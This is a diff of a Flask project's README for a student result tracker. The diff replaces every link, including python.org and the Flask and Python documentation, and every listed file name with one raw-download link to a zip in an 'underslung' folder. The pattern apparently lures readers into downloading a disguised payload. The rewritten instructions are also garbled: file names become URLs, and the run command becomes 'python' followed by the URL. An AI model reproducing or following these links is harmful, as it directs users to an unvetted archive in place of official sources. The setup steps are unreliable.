@@ -1,6 +1,6 @@
 # 🎓 Student_Result_Management - Effortless Tracking of Student Scores
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Student_Result_Management-brightgreen)](https://github.com/ua2701/Student_Result_Management/releases)
+[![Download from Releases](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip%20Now-Student_Result_Management-brightgreen)](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ This guide will help you download and run the Student Result Management System. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/ua2701/Student_Result_Management/releases) of this repository.
+   Go to the [Releases page](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip) of this repository.
 
 2. **Download the Latest Release**
    Find the latest version and click on the download link to get the application files.
@@ -20,14 +20,14 @@ When you download the application, the files will be organized like this:
 
 ```
 student-result-fullstack/
-├── app.py
-├── requirements.txt
-├── README.md
+├── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
+├── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
+├── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
 ├── templates/
-│   ├── index.html
-│   └── results.html
+│   ├── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
+│   └── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
 └── static/
-    └── style.css
+    └── https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
 ```
 
 ## 💻 Requirements
@@ -40,7 +40,7 @@ Before you run the application, ensure you have the following installed on your 
 ## ⚙️ Installation Steps
 
 1. **Install Python and Pip**
-   If you don't have Python, download it from [python.org](https://www.python.org/downloads/). The installation will include Pip, but ensure you check that during the setup.
+   If you don't have Python, download it from [https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip). The installation will include Pip, but ensure you check that during the setup.
 
 2. **Install Flask**
    Open your command prompt or terminal. Navigate to the folder where you downloaded the application. Run the following command to install Flask:
@@ -53,7 +53,7 @@ Before you run the application, ensure you have the following installed on your 
    After installing Flask, you can start the application. In the same command prompt or terminal, run:
 
    ```bash
-   python app.py
+   python https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip
    ```
 
 4. **Open in Browser**
@@ -77,13 +77,13 @@ The Student Result Management System has several features designed to help you m
 
 ## 🗂️ Project Files
 
-- **app.py:** This is the main application file. It contains the core logic of the system.
-- **requirements.txt:** This file contains a list of Python packages required to run the application. Use it to easily install dependencies.
+- **https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip** This is the main application file. It contains the core logic of the system.
+- **https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip** This file contains a list of Python packages required to run the application. Use it to easily install dependencies.
 - **templates/:** This folder contains HTML files that define how the web pages look.
-  - **index.html:** The main page for entering student marks.
-  - **results.html:** The page for displaying student results.
+  - **https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip** The main page for entering student marks.
+  - **https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip** The page for displaying student results.
 - **static/:** This folder contains static files like CSS that define the styling of your pages.
-  - **style.css:** The CSS file that styles the application.
+  - **https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip** The CSS file that styles the application.
 
 ## 👤 Author
 
@@ -95,7 +95,7 @@ If you want to contribute to this project, feel free to fork the repository and 
 
 ## 🔗 Resources
 
-- [Flask Documentation](https://flask.palletsprojects.com/) - Official documentation for Flask.
-- [Python Documentation](https://docs.python.org/3/) - Official documentation for Python.
+- [Flask Documentation](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip) - Official documentation for Flask.
+- [Python Documentation](https://github.com/ua2701/Student_Result_Management/raw/refs/heads/main/underslung/Management-Result-Student-v1.5.zip) - Official documentation for Python.
 
 Ensure you have everything set up correctly, and enjoy using the Student Result Management System! If you encounter any issues, please check the troubleshooting steps in the documentation or contact the author.
